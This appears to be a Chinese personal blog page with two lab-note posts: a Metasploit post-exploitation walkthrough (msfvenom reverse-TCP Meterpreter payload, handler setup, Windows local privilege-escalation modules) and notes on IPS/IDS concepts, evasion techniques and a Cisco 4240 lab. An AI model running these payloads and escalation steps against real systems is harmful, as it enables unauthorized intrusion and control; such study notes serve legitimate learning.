                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:22:25+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  509 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-利用漏洞直接提权为system-1"><a href="#4-利用漏洞直接提权为system-1" class="headerlink" title="4. 利用漏洞直接提权为system-1"></a>4. 利用漏洞直接提权为system-1</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_053_schlamperei</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>
<h4 id="5-利用漏洞直接提权为system-2"><a href="#5-利用漏洞直接提权为system-2" class="headerlink" title="5. 利用漏洞直接提权为system-2"></a>5. 利用漏洞直接提权为system-2</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_081_track_popup_menu</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>
<h4 id="6-利用漏洞直接提权为system-3"><a href="#6-利用漏洞直接提权为system-3" class="headerlink" title="6. 利用漏洞直接提权为system-3"></a>6. 利用漏洞直接提权为system-3</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms13_097_ie_registry_symlink</code></strong><ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Not-vulnerable;Not running inside an Internet Explorer process</li>
</ul>
</li>
</ul>
<h4 id="7-利用漏洞直接提权为system-4"><a href="#7-利用漏洞直接提权为system-4" class="headerlink" title="7. 利用漏洞直接提权为system-4"></a>7. 利用漏洞直接提权为system-4</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ppr_flatten_rec</code></strong> <ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/" itemprop="url">IPS笔记-1：IPS基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T23:46:03+08:00">
                2020-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-一个真实的蠕虫攻击"><a href="#1-一个真实的蠕虫攻击" class="headerlink" title="1. 一个真实的蠕虫攻击"></a>1. 一个真实的蠕虫攻击</h4><ul>
<li>扫描，发现主机</li>
<li>向目标主机发送溢出报文，控制目标机</li>
<li>获取目标机控制权</li>
<li>目标机发攻击<ul>
<li>向新受害者发起攻击，最终形成规模攻击</li>
<li>将真正攻击者隐藏，增加追查难度</li>
</ul>
</li>
<li>▲ 蠕虫病毒具有自传播性，可以感染整个内网，不同于其他的病毒</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=e284j6QmeWJRvDie_siyUe73O3szRjoMRw1OC0YIEV0cbecwdYy1JR5Pdg2Fnwqosz-rGFd_cuOkLW6yGcUak0tytYw72M-AmAUdsbOcS1hc0vB4YJ4aem_Yv5OXFzI4R9OGGKh108rSn_I-MNz0fLA&file_name=/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB.png" alt="蠕虫病毒攻击"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0d135laT_e9iOm2Iry1jqdOTP8W81bZ_gk5jBh3PhCM4JjaNVzZ1uDtG3HyY3WpNXlkpa0vN4wuI-HW-Qi2yTGe9MtvI3XHstNo6D5aaae95KCSar4JpECwhutvIuOdxYyAH80F4GawdpdKQ1PbUwOs-Ga7RDfSN61oZWWc&file_name=/%E5%95%86%E4%B8%9A%E5%8C%96%E9%98%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" alt="商业化防攻击解决方案"></p>
<h4 id="2-IDS产品"><a href="#2-IDS产品" class="headerlink" title="2. IDS产品"></a>2. IDS产品</h4><ul>
<li>IDS定义：Intrusion Detection System，入侵检测系统<ul>
<li>An intrusion detection system has the capability to <strong>detect</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IDS的两个关键特征<ul>
<li>实现应用层威胁识别，提供对网络数据的“监视功能”</li>
<li>旁路部署，与防火墙配合实现安全防范</li>
</ul>
</li>
<li>IDS优势<ul>
<li>IDS不影响网络</li>
<li>IDS的损坏不会影响到网络的功能</li>
<li>一旦超过了IDS的处理能力不会影响到网络流量，虽然这些数据不能够被IDS分析</li>
</ul>
</li>
<li>IDS问题<ul>
<li>IDS response action不能够阻止初始化包，也不能够保证阻止一个连接，IDS的响应技术能够比较好的阻止一个攻击者而不是一个攻击（Reset，Block）</li>
<li>IDS更容易受到网络逃避技术的攻击</li>
</ul>
</li>
<li><strong>注意</strong><ul>
<li>▲ IDS一般用于全流量镜像分析</li>
</ul>
</li>
</ul>
<h4 id="3-IPS产品"><a href="#3-IPS产品" class="headerlink" title="3. IPS产品"></a>3. IPS产品</h4><ul>
<li>IPS定义：Intrusion Prevention System，入侵防御系统<ul>
<li>An intrusion detection system has the capability to <strong>detect and prevent</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IPS的两个关键特征<ul>
<li>深入七层的数据流攻击特征检测<ul>
<li>蠕虫、基于Web的攻击、利用漏洞的攻击、网页篡改、木马、病毒、P2P滥用、DoS/DDoS等</li>
</ul>
</li>
<li>在线部署，实时阻断攻击</li>
</ul>
</li>
<li>IPS优势<ul>
<li>IPS deny action能够阻止触发包，后续数据包，或者所有源至于攻击者的包</li>
<li>IPS能够使用流量规范化技术，减少或者消除很多网络逃避技术</li>
<li>IPS能够有效的阻止蠕虫</li>
</ul>
</li>
<li>IPS问题<ul>
<li>IPS的错误或者损坏会影响到网络的流量</li>
<li>一旦超过了IPS的处理能力，会影响到网络的正常工作</li>
<li>IPS会影响到对时间敏感的运用程序，例如VOIP</li>
</ul>
</li>
<li>衡量IPS的标准<ul>
<li>False positive（错报）</li>
<li>False negative（漏报）</li>
</ul>
</li>
<li>⭐ IPS三种接口类型<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入<ul>
<li>IPS工作模式</li>
</ul>
</li>
</ul>
</li>
<li>Promiscuous-Mode Protection：IDS</li>
<li>Inline-Mode Protection：IPS</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=44cbT-wPM_Vv23Ww-TURqwwHSJb3dTcVW4vHcmwRJ_3ZTyo8Ot6ErFEhoqr2YDj5XTz7Q7alpYO_cV6HHvwfeLfVjAmElg03HyFTRceJRoB4nP1C3gcdHM9uL7FotJEprmp49uTBO2kfU55ESA&file_name=/IPS--IDS%E9%83%A8%E7%BD%B2.png" alt="IPS--IDS部署"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=fe16_qyGW7FVih7me_ZyhWk0qPlqtd-LTNSP4mr2jIILjBzHMg9zuax40fbYI2U4_qsWLEGdIZkTb3MfFyGqQm1yLsMfKZLKyfQh0hBU5196usmJm6kB6J_W6Q7SHvIXBQqNuduxMEbtsftwDA&file_name=/IPS--IPS%E9%83%A8%E7%BD%B2.png" alt="IPS--IPS部署"></p>
<ul>
<li><strong>注意</strong>：<ul>
<li>▲ 可以单一部署IPS</li>
<li>▲ IPS可以类比于外部的AV查杀软件</li>
</ul>
</li>
</ul>
<h4 id="4-IPS-IDS技术发展历程"><a href="#4-IPS-IDS技术发展历程" class="headerlink" title="4. IPS/IDS技术发展历程"></a>4. IPS/IDS技术发展历程</h4><ul>
<li>1987年，入侵安全检测专家系统模型的提出</li>
<li>1988年，Morris蠕虫的爆发，促进了IDS开发研制</li>
<li>1990年，网络IDS–NSM（网络安全监视）用来检测所监视的广域网的网络流量的可疑行为</li>
<li>1998年，开源IDS：Snort</li>
<li>2000年，非IDS厂商提出IPS概念，并发布产品</li>
<li>2003年，主流开始使用IPS</li>
</ul>
<h4 id="5-IPS、IDS、防火墙"><a href="#5-IPS、IDS、防火墙" class="headerlink" title="5. IPS、IDS、防火墙"></a>5. IPS、IDS、防火墙</h4><ul>
<li>在网络环境中，FW、IPS一前一后部署，形成纵深的立体防御</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=15b6QPvjOjTJlUcmuAr4-DOWYcbqE1KwiROyeIO8bSn-X8OfcRgqKFdecpY_PFdkJG8IHfcj0gfW8jwLDLMQAvGFBP0PAkbwIqBi2mofdZJZO4dle_vkdg4MbpvriATInScP8JWwpBIZmAxH87cJrc0YKavHAxY&file_name=/IPS%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与防火墙的比较"></p>
<ul>
<li>由于IDS与生俱来的缺陷，IPS必将全面取代IDS。DPtech IPS 2000可以同时实现IPS/IDS</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=071eP1Md5n_ZxiyscToj5uCQ5dr7aa8QktRctL9sCS9DlOjqokHokguFwYyd4cp_hV6JnbncnJxtuIHwRmfEnoqduYGQYcBxULbR5Q9cBJJkAWDRX5ZVWU9ANgBYVulKQF6mmxl6lz_bfXWBttxpoPw&file_name=/IPS%E4%B8%8EIDS%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与IDS的比较"></p>
<ul>
<li>防火墙主要提供安全区域隔离、访问控制和VPN功能、不能有效检测并阻断夹杂在正常流量中的应用层攻击代码<ul>
<li>DMZ区域对外提供服务</li>
</ul>
</li>
<li>IDS由于旁路部署，侧重安全状态监控，需要和防火墙联动才能抵御威胁，适用于“事后审计”，无法满足实时安全防护</li>
<li>IPS在线部署、主动防御、实时阻断攻击</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=23a2Q0jiQZ17q8iSp7-M0bROS4SM3b6ukxFH5Y_Jh7FS6nUKsTE_cqCFlF7BsRQbY1gSMiH-17ciPLB9DCdKmgUW627vx2srT_LYh4B4yxofApGW120bkTaFfiOYrVbStF3kzQul-vUCgycmfeiEIS-5q-I&file_name=/IPS%E3%80%81IDS%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="IPS、IDS、防火墙"></p>
<h4 id="6-⭐-技术介绍"><a href="#6-⭐-技术介绍" class="headerlink" title="6. ⭐ 技术介绍"></a>6. ⭐ 技术介绍</h4><ul>
<li>Profile-Based Intrustion Detection<ul>
<li>特点：定义正常流量，其余均为非法流量</li>
<li>优点：黑客很难判断什么是合法流量，能够发现最新的还没被公布的攻击</li>
<li>缺点：很难规定正常流量，告警很难理解，错误误报很多</li>
<li>产品：主机IPS（CSA）</li>
</ul>
</li>
<li>Signature-Based Intrusion Detection<ul>
<li>特点：通过Signaure（特性代码）匹配攻击</li>
<li>优点：架构很容易，告警很容易理解，能够自定义Sig</li>
<li>缺点：不能检测未被公布的攻击，需要经常升级，需要Cache流量</li>
<li>产品：网络IPS（4215，4240….）</li>
</ul>
</li>
<li>Protocol Analysis<ul>
<li>特点：基于RFC或者安全规范监控协议</li>
<li>产品：防火墙的运用层监控</li>
</ul>
</li>
</ul>
<h4 id="7-⭐-躲避手段"><a href="#7-⭐-躲避手段" class="headerlink" title="7. ⭐ 躲避手段"></a>7. ⭐ 躲避手段</h4><ul>
<li>Flooding（泛洪攻击）<ul>
<li>逃避手段：制造大量超出IPS处理能力的流量，掩护非法流量穿越IPS</li>
</ul>
</li>
<li>Frametation（分片）<ul>
<li>逃避手段：制造大量分片耗尽IPS缓存，实施对IPS的DoS，掩护非法分片流量</li>
</ul>
</li>
<li>Encryption（加密）<ul>
<li>逃避手段：加密攻击流量</li>
<li>例如：通过木马控制客户端发起加密流量到攻击者</li>
</ul>
</li>
<li>Obfuscation（困惑）<ul>
<li>逃避手段：攻击者通过不同的编码方式来逃避IPS检测</li>
<li>例如：@法#轮￥功%</li>
</ul>
</li>
</ul>
<h4 id="8-Cisco-4240"><a href="#8-Cisco-4240" class="headerlink" title="8. Cisco 4240"></a>8. Cisco 4240</h4><ul>
<li>Cisco 4240正面板<ul>
<li>Cisco的IPS与防火墙外观相同，仅简介不同</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=27409mwK21bC_Cfuum294IA89Ft8vh2hd2hozSf1JEFVHyH0F0165J3IdI5_WYlxAaTXJe85KwxyKkhbUOfFH_5aFbUqUeNoxQncW8mTFOwZHQH4RmILZKU10igh_d3lADzj5xYaLS0PeazY3g&file_name=/Cisco%E6%AD%A3%E9%9D%A2%E6%9D%BF.png" alt="Cisco正面板"></p>
<ul>
<li>Cisco 4240背面板<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=369dJXi3GfbYDQlpT79NnBJ3vq5U_n6ynDLmJSOkqeih_vzZG-nR5kJTn-LSFnacd-fgTvr6HWB_25Hm4ROEkOOMWSp61fHEa_h9smz5XKxh7WLDFiSiioDIn5c8Jkw-UUKFDRGUnj6zl9hQ7w&file_name=/Cisco%E8%83%8C%E9%9D%A2%E6%9D%BF.png" alt="Cisco背面板"></p>
<h4 id="9-实验"><a href="#9-实验" class="headerlink" title="9. 实验"></a>9. 实验</h4><ul>
<li>GNS3 0.8.6（傻瓜式安装）<ul>
<li>需要安装Winpcap 4.1.3</li>
<li>需要安装Wireshark 1.10.2（32bit）</li>
<li>导入ISO<ul>
<li>Edit → IOS and Hypervisors → Image file → bin文件 → save</li>
<li>导入路径不能有中文字符</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=706aVgYmdqzPGteriMxwZ-Z7zD40GuvwARwckyvIXSf3gjIfRwFplvuU7ttWtC77b-Wo2nfYJbFojx9GIn_ihvxROX0I5oEmpo922cTdo850IEsjXDQ6aJ0QGDSk9QwfRT8o70elHGbPZ-sYbNPO&file_name=/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS3配置成功"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=01b7L4Ehk8k5tK5K7rdIpqy7JyuNFtgM86k8GU2GDc-N3YLdCF2F90ugY8ZipaO8_NDp9CbSuMCqgp-raWqq4VDMGiX4N-EBvzGd7C49D-51UQJtcZ58kNfN_HhL0D76RFKe6hVC5eeGm3NfvAR0&file_name=/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS导入镜像成功"></p>
<ul>
<li>SecureCRT_6.5.3.490（傻瓜式安装）<ul>
<li>可以自定义安装，不占C盘资源空间</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=121739saVypv-dU14ijaICrfcltkD7N6pD7kO5VQzErwbdoZrZkzWlkvcpb3I-qANGiHg6Jn9_Sw2f_d6ziFGgmWam2T3h7_2iaSWKoV9DiGD7-UY4VMNSj_iMwsg4TK1f27TUMhs1iGcCrKQ7Km1N6JzaU&file_name=/SecureCRT%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="SecureCRT配置成功"> </p>
<ul>
<li>IPS-4240<ul>
<li>导入ova文件，设置新虚拟机位置<ul>
<li>账号：cisco</li>
<li>密码：ciscoips123</li>
</ul>
</li>
<li>网络适配器：自定义（VMnet8(NAT模式)）</li>
<li>网络适配器2：自定义VMnet2</li>
<li>网络适配器3：自定义VMnet3</li>
<li>网络适配器4：桥接模式（自动）</li>
<li>网络适配器5：桥接模式（自动）</li>
<li>新增串行端口：使用命名的管道:\.\pipe\842-1</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5aa9OxjvpfUe-hD0QR0nQ8fOIBcep6tL7DCJ5_vo1RXXES-GnmqH5_Qj9k2UBWWIPSKPdGDZn7wXcqLEki4wRdtHVPGzYqTlxK7HUOm9XjaaXVoEi92G5pP13Hul_5NnaGNQvdybvh5HyGK4SPw&file_name=/IPS%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS配置成功"></p>
<ul>
<li>Piped.exe（用MFC开发）<ul>
<li>模拟IPS串行端口</li>
<li>输入Pipe和自定义Port</li>
</ul>
</li>
</ul>
<p>！<a href="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=3725P9R42nRiK9QG2b6JwrjRMUuE0xPuC3D-wm3-dlZecPu-WZWgvOYOxH8dMmHWbahjqTdXl5eDL5iP_cDdhTU9-pqLk_R0e0R-UpYTHU3kGS1Hy7qyydpqQwzc4dbSmotDFvoh-eoSsxzVS5uBug&file_name=/Piped%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" target="_blank" rel="noopener">Piped配置成功</a></p>
<ul>
<li>SecureCRT连接<ul>
<li>新建快速连接<ul>
<li>协议：Telnet</li>
<li>主机名：127.0.0.1</li>
<li>端口：在Piped自定义的Port</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=be66k7swSlY87CU4iX8OInWGVbCT-5huyIR5_tv0Y5A9X04EytgemiQ1BKywp5PUT-XjqK0aZEzikgO_BVHCQFub3UtN96UOWhKDPc_54Cn1rg4kWx0P9GStdXHm7NlIQPMXx9cK9WfcvlYdFCfAS1oZ6HI&file_name=/SecureCRT%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="SecureCRT连接成功"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/3/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">142</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">126.1k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
